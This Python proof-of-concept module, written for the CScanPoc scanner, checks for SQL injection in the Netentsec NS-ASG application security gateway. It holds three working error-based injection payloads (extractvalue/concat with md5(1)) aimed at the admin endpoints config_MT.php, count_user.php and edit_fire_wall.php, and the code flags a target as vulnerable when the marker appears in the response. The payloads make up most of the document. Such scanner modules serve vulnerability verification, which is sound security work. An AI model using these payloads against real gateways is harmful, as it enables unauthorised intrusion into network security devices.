# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re, urlparse

class Vuln(ABVuln):
    vuln_id = 'Netentsec_0022'  # 平台漏洞编号，留空
    name = '网康NS-ASG SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION # 漏洞类型
    disclosure_date = '2014-04-30'  # 漏洞公布时间
    desc = '''
        网康 NS-ASG 应用安全网关多处 GET报错漏洞：
        /admin/config_MT.php?action=
        /admin/count_user.php?action=
        /admin/edit_fire_wall.php?action=
    '''  # 漏洞描述
    ref = ''  # 漏洞来源
    cnvd_id = ''  # cnvd漏洞编号
    cve_id = ''  # cve编号
    product = '应用安全网关'  # 漏洞应用名称
    product_version = ''  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = 'bb68fad1-2190-45c5-81c7-67e4bd9100a0'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-26'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            #refer: http://www.wooyun.org/bugs/wooyun-2014-058987
            hh = hackhttp.hackhttp()
            arg = self.target
            md5_1 = 'c4ca4238a'
            #GET 报错注入
            payloads = [
                arg + '/admin/config_MT.php?action=delete&Mid=1%20and%20extractvalue(0x1,concat(0x23,md5(1)))',
                arg + '/admin/count_user.php?action=GO&search=%27%0band%0bextractvalue(0x1,concat(0x23,md5(1)))%23',
                arg + '/admin/edit_fire_wall.php?action=update&FireWallId=111%20and%20extractvalue(0x1,concat(0x23,md5(1)))',
            ]
            for payload in payloads:
                code, head, res, err, _ = hh.http(payload)
                
                if (code == 200) and (md5_1 in res):
                    #security_hole('SQL Injection: ' + payload)
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                        target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()

if __name__ == '__main__':
    Poc().run()
